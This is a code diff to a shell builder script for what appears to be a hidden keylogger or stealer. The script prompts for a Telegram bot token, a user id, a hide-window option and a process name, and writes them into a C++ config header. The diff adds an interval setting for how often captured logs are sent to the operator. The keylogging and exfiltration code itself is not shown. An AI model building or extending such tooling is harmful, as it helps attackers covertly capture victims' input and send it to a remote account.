@@ -20,7 +20,7 @@ logo() {
     echo -e "\033[0;32m                            \88    88          \033[0m"
     echo -e "\033[0;32m                             \888888           \033[0m"
     echo -e "\033[0;32m                                               \033[0m"
-    echo -e "\033[0;32m             💚 Created by He4vyL0v3           \033[0m"
+    echo -e "\033[0;32m               Created by He4vyL0v3            \033[0m"
     echo -e "\033[0;32m                                               \033[0m"
 }
 
@@ -59,6 +59,8 @@ else
     log_to_console="false"
 fi
 
+
+read -p "Enter the time interval in minutes after which the log will be sent to you: " wait_time
 read -p "Enter the TG bot token: " bot_token
 read -p "Enter the user id TG: " tg_user_id
 
@@ -87,6 +89,7 @@ echo "Process name: $process_name"
 echo "Log to file: $log_to_file"
 echo "Hide window: $hide_window"
 echo "Log to console: $log_to_console"
+echo "Wait time: $wait_time"
 echo "Bot token: $bot_token"
 echo "User ID: $tg_user_id"
 
@@ -106,6 +109,7 @@ echo "#include <string>" >> src/config.h
 echo "const bool           logToFile     = ${log_to_file};" >> src/config.h
 echo "const bool           logToConsole  = ${log_to_console};" >> src/config.h
 echo "const bool           hideWindow    = ${hide_window};" >> src/config.h
+echo "const int            waitTime      = ${wait_time};" >> src/config.h
 echo "const std::wstring   botToken      = L\"${bot_token}\";" >> src/config.h
 echo "const std::wstring   userID        = L\"${tg_user_id}\";" >> src/config.h
 
